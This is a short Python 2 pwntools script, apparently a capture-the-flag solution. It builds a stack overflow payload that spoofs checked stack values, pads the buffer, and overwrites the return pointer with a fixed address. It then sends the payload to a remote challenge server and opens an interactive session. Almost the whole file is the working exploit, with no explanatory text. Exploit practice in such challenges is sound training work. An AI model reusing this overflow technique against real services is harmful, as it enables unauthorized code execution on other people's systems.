#!/usr/bin/env python

# Run in python 2
from pwn import *
def identifier(l=26):
    output = ""
    for i in range(65,65+l):
        output+=chr(i)*4
    return output


diff = 0xffffcdec-0xffffccf8 #Difference from checked values to return pointer
#diff = 0xffffcdec-0xffffcce8 # Difference to return pointer
#diff=4880 #If you want a SIGSEGV
print(diff)
varmatching="" #Remove security
varmatch = [0xc0c0dede,0x00000000,0xf7fa35c0,0xf7fa3d80]
for i in varmatch:
    varmatching+=p32(i)
padding = "A"*int(diff)

eip = (p32(0x80485db))
exploit=varmatching+padding+eip+"BBBB"
#exploit = "A"*(diff+8)
#exploit = identifier()*int(4880)



with open("payload.in","w") as f:
    f.write(exploit)
    
if True: #Enable remote hacking?
    conn = remote('challenges.csdc20t.ctf.sg',10014)
    # Main menu
    print(conn.recvuntil("=>"))
    conn.send(exploit+"\n")
    conn.interactive()
